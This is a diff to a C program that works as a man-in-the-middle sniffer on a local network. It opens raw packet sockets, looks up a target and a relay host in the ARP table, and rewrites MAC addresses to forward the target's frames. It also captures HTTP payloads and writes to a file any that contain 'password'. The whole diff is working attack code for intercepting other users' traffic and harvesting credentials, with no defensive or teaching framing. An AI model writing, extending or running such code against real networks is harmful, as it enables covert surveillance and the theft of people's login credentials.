@@ -4,7 +4,12 @@
 #include <string.h>
 #include <stdlib.h>
 #include <errno.h>
+#include <arpa/inet.h>
+#include <net/if.h> // for ifreq
+#include <sys/ioctl.h> //ioctl
 
+//ARP file
+#define ARP_TABEL  "/proc/net/arp"
 
 //link Layer Sock Discriptor 
 typedef struct {
@@ -82,29 +87,40 @@ typedef struct {
 
 //Globel Var
 int forwardSock;
+int receiverSock;
 int DataSize;
 int run = 1;
 int counter = 0;
 char devider[] = "\n ********************************************************************";
-unsigned char mac[6]; 
-unsigned char ip[4];
 
-unsigned char maskMac[]   = {0xd0,0x17,0xc2,0x9c,0x42,0x28};
-unsigned char targetMac[] =  {0x70,0x54,0xd2,0x44,0x95,0x9e};//{0x70,0x54,0xd2,0x44,0x95,0x9e};//lk  //{0xac,0x87,0xa3,0x2c,0x6b,0xaf}; //pk
-int targetIp[4]={192,168,1,61};
+int interface_index = 2;
+unsigned char own_mac_Add[6] = {0x9c,0x5c,0x8e,0x8e,0x6e,0xbe}; //middel man
+unsigned char own_ip_Add[4];
+
+unsigned char target [15]; //i.g 192.150.160.10   
+unsigned char target_bin[4]; // ip in binary format
+unsigned char target_mac[] =  {0xac,0x87,0xa3,0x2c,0x6b,0xaf};//{0x70,0x54,0xd2,0x44,0x95,0x9e};//lk  //{0xac,0x87,0xa3,0x2c,0x6b,0xaf}; //pk
+unsigned char mask [15];  //i.g 192.150.160.101   
+unsigned char mask_bin[4]; // ip in binary format
+unsigned char mask_mac[6]   = {0xd0,0x17,0xc2,0x9c,0x42,0x28};
+
 
 EtherNetFram eth;
 IPv4Header ipv4Header;
 TCP_packet tcp;
 ARP_Packet arp_packet;
-LL_SockAddr ll_sock_disc;
+LL_SockAddr ll_sock_disc,ll_sock_disc_rec; ;
 
 
 //Function dec
+void getInterface();
 void forward(unsigned char *buf); 
 void setUpForwarding();
-int isFromTarget();
+void setUpReceveing();
+int  isFromTarget();
 void writeToFile(unsigned char *data,int DataSize);
+void getTargetInfo(unsigned char *target, unsigned char *target_mac);
+int  find(char *buffer, char *pattern, int len);
 
 
  //DeCode EtherNet
@@ -145,17 +161,15 @@ void decodeARP(unsigned char *buf, ARP_Packet *arp){
  printf("  TPA => %d.%d.%d.%d \n\n",(int)arp_packet.TPA_2[0],(int)arp_packet.TPA_2[1], (int)arp_packet.TPA_4[0],(int)arp_packet.TPA_4[1]);
 }
 
-
 // DeCode IPv4 Header
 void decodeIPv4(unsigned char *buf, IPv4Header *ipv4){
     memcpy(ipv4, &buf[14], 20);
 
-  // printf("\n protocal :%02X",ipv4->protocal);
-    // printf("\n header len :%d",ipv4->hl);
-    // printf("\n payload len :%d",htons(ipv4->tol));
-    // printf("\n frag flags :%03X",ipv4->flags);  
+    printf("\n protocal :%02X",ipv4->protocal);
+    printf("\n header len :%d",ipv4->hl);
+    printf("\n payload len :%d",htons(ipv4->tol));
+    printf("\n frag flags :%03X",ipv4->flags);  
     // printf("\n Type of Service :%02X\n",ipv);   
-    
     printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4->src_addr[0], (int)ipv4->src_addr[1], (int)ipv4->src_addr[2], (int)ipv4->src_addr[3]);
     printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4->dst_addr[0], (int)ipv4->dst_addr[1], (int)ipv4->dst_addr[2], (int)ipv4->dst_addr[3]);
 }  
@@ -172,18 +186,18 @@ void decodeTCP(unsigned char *buf, TCP_packet *tcp){
   // printf("\n data start :%d",dataStart);
   
    // 65 Header Size
-   printf("\n payload size :%d",DataSize);
+  //  printf("\n payload size :%d",DataSize);
    if( (int)htons(tcp->dst_port) == 80 || (int)htons(tcp->src_port) == 80 ){
-    printf("\n HTTP data.."); 
+    // printf("\n HTTP data.."); 
     int header = 65 + dataStart;
     if(DataSize - header > 0){
         unsigned char data [DataSize-header];
-        printf("\n Header Size :%d",header);
-        printf("\n data size :%lu",sizeof(data));
+        // printf("\n Header Size :%d",header);
+        // printf("\n data size :%lu",sizeof(data));
         memcpy(data,&buf[header], DataSize-header);
 
         printf("\n HTTP.. Payload ...");
-        printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.src_addr[0], (int)ipv4Header.src_addr[1], (int)ipv4Header.src_addr[2], (int)ipv4Header.src_addr[3]);
+        // printf("\n src Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.src_addr[0], (int)ipv4Header.src_addr[1], (int)ipv4Header.src_addr[2], (int)ipv4Header.src_addr[3]);
         // printf("\n Dst Addresss Decoded :%d.%d.%d.%d",(int)ipv4Header.dst_addr[0], (int)ipv4Header.dst_addr[1], (int)ipv4Header.dst_addr[2], (int)ipv4Header.dst_addr[3]);
         
         // //chk is trafic from target then forward
@@ -192,19 +206,67 @@ void decodeTCP(unsigned char *buf, TCP_packet *tcp){
         if(isFromTarget()){
           printf("\n Is from target");
           //Forward the tarfic 
-           memcpy(buf, &maskMac, 6); // dst macto mask mac 
-           memcpy(&buf[6], &targetMac, 6); // change src mac back to target
+           memcpy(buf, &mask_mac, 6); // dst mac to mask mac 
+          //  memcpy(&buf[6], &targetMac, 6); // change src mac back to target
            forward(buf);
           //  exit(0);
         }
         
-        if(strstr(data, "username"))
+        if(strstr(data, "password"))
           writeToFile(data,sizeof(data));
 
         // if(sizeof(data) == 1)
           // writeToFile(data,sizeof(data));  
     }
    }
+}
+
+//Get interface index & info
+void getInterface(){
+     
+    unsigned char ifName[]={'e','n','p','3','s','0'};  
+                             // enp3s0
+    struct ifreq ifr;
+    memcpy(ifr.ifr_name, ifName, sizeof(ifName));
+
+    int fd = socket(AF_INET,SOCK_DGRAM,0);
+    if(fd != -1){
+       
+       if(ioctl(fd, SIOCGIFINDEX, &ifr) != -1 ){
+          printf("\n Enterface :%s index :%d",ifName, ifr.ifr_ifindex);
+          interface_index = ifr.ifr_ifindex;
+       }
+       else{
+        printf("\n get interface ioclt failed ...%d \n",errno);
+        exit(0);
+        }
+    
+       if(ioctl(fd, SIOCGIFHWADDR, &ifr) != -1){
+        memcpy(own_mac_Add, ifr.ifr_hwaddr.sa_data, 6); 
+        printf("\n Enterface :%s mac =>%0x:%0x:%0x:%0x:%0x:%0x",ifName,own_mac_Add[0],own_mac_Add[1],own_mac_Add[2],own_mac_Add[3],own_mac_Add[4],own_mac_Add[5]);
+       }
+       else{
+        printf("\n get interface ioclt failed ...%d \n",errno);
+        exit(0);
+       }
+     
+       if(ioctl(fd, SIOCGIFADDR, &ifr) != -1){
+
+        struct sockaddr_in *ipAddr = (struct sockaddr_in *) &ifr.ifr_addr;
+        struct in_addr *inAddr     = (struct in_addr *) &ipAddr->sin_addr;
+        memcpy(own_ip_Add, &inAddr->s_addr, 4);
+        printf("\n Enterface :%s ipv4 =>%d.%d.%d.%d",ifName,(int)own_ip_Add[0],(int)own_ip_Add[1],(int)own_ip_Add[2],(int)own_ip_Add[3]);
+       }
+       else{
+        printf("\n get interface ioctl failed ...%d \n",errno);
+        exit(0);
+       }
+  
+    }
+    else{
+     printf("\n get interface info sock creation failed ...%d \n",errno);
+     exit(0);}
+    
 }
 
 void writeToFile(unsigned char *data, int len){ 
@@ -239,14 +301,57 @@ void writeToFile(unsigned char *data, int len){
 } 
 
 int isFromTarget(){
-  printf("\n checking target ip");
+  // printf("\n checking target ip");
   
-  if(targetIp[3] ==  (int)ipv4Header.src_addr[3])
+  if(target_bin[3] ==  (int)ipv4Header.src_addr[3])
       return 1;
   else
     return 0;
 }
-   
+
+// Receiving socket
+void setUpReceveing(){
+ receiverSock = socket(AF_PACKET, SOCK_RAW, htons(0x0003)); 
+    if(receiverSock > 0){
+      
+      printf("\n Receiver socket is created ....");
+
+      // initialize link layer sock discriptor 
+      ll_sock_disc_rec.sll_family   = AF_PACKET; // AF_PACKET *default
+      ll_sock_disc_rec.sll_protocol = htons(0x0003); // Not required  0 for nothing
+      ll_sock_disc_rec.sll_ifindex  = interface_index;
+      ll_sock_disc_rec.sll_hatype   = 0; // Not required  0 for nothing
+      ll_sock_disc_rec.sll_pkttype  = '0'; // Not required  0 for nothing
+      ll_sock_disc_rec.sll_halen    = '6';
+      memcpy(ll_sock_disc_rec.sll_addr, &target_mac, 6);
+      
+
+       //debug ll sock
+       printf("\n\n family :%d",ll_sock_disc_rec.sll_family);
+       printf("\n protocol :%d",ll_sock_disc_rec.sll_protocol);
+       printf("\n if index :%d",ll_sock_disc_rec.sll_ifindex);
+       printf("\n hatype :%d",ll_sock_disc_rec.sll_hatype);
+       printf("\n pkt type :%c",ll_sock_disc_rec.sll_pkttype);
+       printf("\n ha-len :%02x",ll_sock_disc_rec.sll_halen);
+       printf("\n addre :=> %02x:%02x:%02x:%02x:%02x:%02x",ll_sock_disc_rec.sll_addr[0], ll_sock_disc_rec.sll_addr[1], ll_sock_disc_rec.sll_addr[2], ll_sock_disc_rec.sll_addr[3], ll_sock_disc_rec.sll_addr[4], ll_sock_disc_rec.sll_addr[5]);
+       
+       printf("\n receiver LL Sock discriptor size :%d",(int) sizeof(ll_sock_disc_rec));
+
+      
+        //Bind
+         int bindStatus = bind(receiverSock, (struct sockaddr *)&ll_sock_disc_rec, sizeof (ll_sock_disc_rec) );
+         printf("\n\n receiver bind status :%d, errorCode :%d",bindStatus,errno); 
+         if(bindStatus == -1)
+           exit(0);
+    }
+    else{
+      printf("\n receiver sock creation failed :%d",errno);
+      exit(0);
+    }
+
+} 
+
+// Sending socket
 void setUpForwarding(){
     forwardSock = socket(AF_PACKET, SOCK_RAW, htons(0x0003));
     if(forwardSock > 0){
@@ -255,11 +360,11 @@ void setUpForwarding(){
       // initialize link layer sock discriptor 
       ll_sock_disc.sll_family   = AF_PACKET; // AF_PACKET *default
       ll_sock_disc.sll_protocol = htons(0x0003); // Not required  0 for nothing
-      ll_sock_disc.sll_ifindex  = 2;
+      ll_sock_disc.sll_ifindex  = interface_index;
       ll_sock_disc.sll_hatype   = 0; // Not required  0 for nothing
       ll_sock_disc.sll_pkttype  = '0'; // Not required  0 for nothing
       ll_sock_disc.sll_halen    = '6';
-      memcpy(ll_sock_disc.sll_addr, &maskMac, 6);
+      memcpy(ll_sock_disc.sll_addr, &mask_mac, 6);
       
 
        //debug ll sock
@@ -276,7 +381,7 @@ void setUpForwarding(){
       
         //Bind
          int bindStatus = bind(forwardSock, (struct sockaddr *)&ll_sock_disc, sizeof (ll_sock_disc) );
-         printf("\n\n bind status :%d, errorCode :%d",bindStatus,errno); 
+         printf("\n\n forward sock bind status :%d, errorCode :%d",bindStatus,errno); 
          if(bindStatus == -1)
            exit(0);
     }
@@ -290,8 +395,8 @@ void setUpForwarding(){
 //forward Data
 int Sendstatus;
 void forward(unsigned char *buf){
-  printf("\n Forwarding Data...");
-  Sendstatus = send(forwardSock, buf, DataSize, 0);
+  // printf("\n Forwarding Data...");
+  Sendstatus = send(forwardSock, buf, DataSize, MSG_DONTWAIT);
   if(Sendstatus < 0){
     printf("\n forwarding failed ..%d",errno);
   }
@@ -301,6 +406,67 @@ void forward(unsigned char *buf){
 }
 
 
+//GEt Target info from arp tabel
+void getTargetInfo(unsigned char * target, unsigned char *targetMac){
+    //find in arp tabel
+    
+    FILE *arpCache = fopen(ARP_TABEL, "r");
+    if(arpCache!=NULL){
+      unsigned char buffe[80]; // 79 char par line *79 byte
+      char c;
+      int i = 0;
+      int targetFound = 0;
+      do{
+          //buffe[i] = (char)fgetc(arpCache);
+          //printf("\n i :%d",i); 
+          buffe[i] = c =(char)fgetc(arpCache);
+          // printf("\n arp Cache len =>%c, hex :%x  i =>%d",buffe[i], buffe[i], i);
+          i++;
+
+          if( 0xa == buffe[i-1]){ // on new line
+               i = 0;     
+             // find target in buffer
+             // printf("\n\nfinding Target ......... i :%d",i);
+               if( find(buffe,target,15) ){
+               printf("\n Target found in Arp tabel.");
+               targetFound = 1;
+             // get target mac
+               targetMac[0] = strtol(&buffe[41],NULL,16);
+               targetMac[1] = strtol(&buffe[44],NULL,16);
+               targetMac[2] = strtol(&buffe[47],NULL,16);
+               targetMac[3] = strtol(&buffe[50],NULL,16);
+               targetMac[4] = strtol(&buffe[53],NULL,16);
+               targetMac[5] = strtol(&buffe[56],NULL,16);
+
+               printf("\n Target Mac => %02X:%02X:%02X:%02X:%02X:%02X",targetMac[0],targetMac[1],targetMac[2],targetMac[3],targetMac[4],targetMac[5]);
+            }
+          }
+      }
+      while( c != EOF && !targetFound);
+      //
+       printf("\n arp cache file closed :%d",fclose(arpCache) );
+      if(!targetFound){
+        printf("\n Target Not found in ARP Tabel.");
+        exit(0);
+      }
+    }
+}
+
+//Patern Match
+int find(char *buffer, char *pattern, int len){
+  //here 0x20 is 'space' charecter in assci
+   for(int i=0; i<len; i++){
+      // printf("\n matcheing => %02x == %02x",buffer[i],pattern[i]); //Debug
+      if(pattern[i] != 0x00 && buffer[i] != 0x20){
+       if(buffer[i] != pattern[i])
+          return 0;
+      }
+         
+   }
+  //  exit(0);
+   return 1;
+} 
+
 
 
 void main(){
@@ -309,37 +475,70 @@ void main(){
   struct sockaddr addr;
   unsigned char buf[MAXMSG];
   
+  //Get Interface detail
+  getInterface();
+
+  //GEt Target ip and Mask mac
+  struct sockaddr_in saddr_ip;
+
+  printf("\nTarget src =>");
+  scanf("%s",target);
+  inet_pton(AF_INET, target, &saddr_ip.sin_addr);
+  memcpy(target_bin, &saddr_ip.sin_addr, 4);
+  printf("\nTarget src binary to string ipv4 =>%d.%d.%d.%d",(int)target_bin[0],(int)target_bin[1],(int)target_bin[2],(int)target_bin[3]); //debug
+  
+  getTargetInfo(target,target_mac);
+  
+  printf("\n\n Mask addr =>");
+  scanf("%s",mask);
+  inet_pton(AF_INET, mask, &saddr_ip.sin_addr);
+  memcpy(mask_bin, &saddr_ip.sin_addr, 4);
+  printf("\nTarget dst binary to string ipv4 =>%d.%d.%d.%d",(int)mask_bin[0],(int)mask_bin[1],(int)mask_bin[2],(int)mask_bin[3]); //debug
+   
+  getTargetInfo(mask,mask_mac);
+  
   //Create and bind sock for forwarding
   setUpForwarding();
+  setUpReceveing();
 
-  socket_desc = socket(AF_PACKET, SOCK_PACKET,htons(0x0003));
+  // socket_desc = socket(AF_PACKET, SOCK_PACKET,htons(0x0003));
 
-  if(socket_desc == -1){
-    printf("Failed to create socket ..\n");
-  }
-  else{
-    printf("Socket created good to go :%d\n",socket_desc);
+  // if(socket_desc == -1){
+  //   printf("Failed to create socket ..\n");
+  // }
+  // else{
+    // printf("Socket created good to go :%d\n",socket_desc);
     // printf("htons ... : %X\n",htons(0x0003));
     int size =  sizeof addr;
     int data;
     while(run){
-      DataSize = data = recvfrom(socket_desc, buf, sizeof(buf), 0, NULL, NULL);
+      DataSize = data = recvfrom(receiverSock, buf, sizeof(buf), 0,NULL,NULL);
       if(data < 0){
-        printf("Can not get any packets, status :%d\n",data);
+        printf("\nCan not get any packets, status :%d",data);
       }
       else{
-        // printf("\n\n\n.........Intercept Some data size..%d\n",data);
+        // printf("\n.........Intercept Some data size..%d",data);
+        // fflush(stdout);
 
-        // EtherNetFram eth;
+       
+        
+        //Filter 
+        if( buf[11] != target_mac[5] || buf[5] == mask_mac[5]){
+           printf("\r Packet droped %d byte ",DataSize);   
+           continue;
+        }
+        printf("\n\n"); 
+         // EtherNetFram eth;
         decodeEther(buf,&eth,0);
+
         switch(htons(eth.type)){
           
           case 0x0800:
-            // printf("\n\n It's IPv4 Packet."); 
+            // printf("\r\a It's IPv4 Packet."); 
             // IPv4Header ipv4Header;
             decodeIPv4(buf,&ipv4Header);
             if(ipv4Header.protocal == 0x06){ // its TCP
-              printf("\n\n It's TCP Packet."); 
+              // printf("\n\n It's TCP Packet."); 
               // TCP_packet tcp;
               decodeTCP(buf,&tcp);
             }
@@ -355,7 +554,8 @@ void main(){
           break;
         }
       }
+    //  system("clear");
     }//While 
-  }
+  // }
  // close(socket_desc);
 }
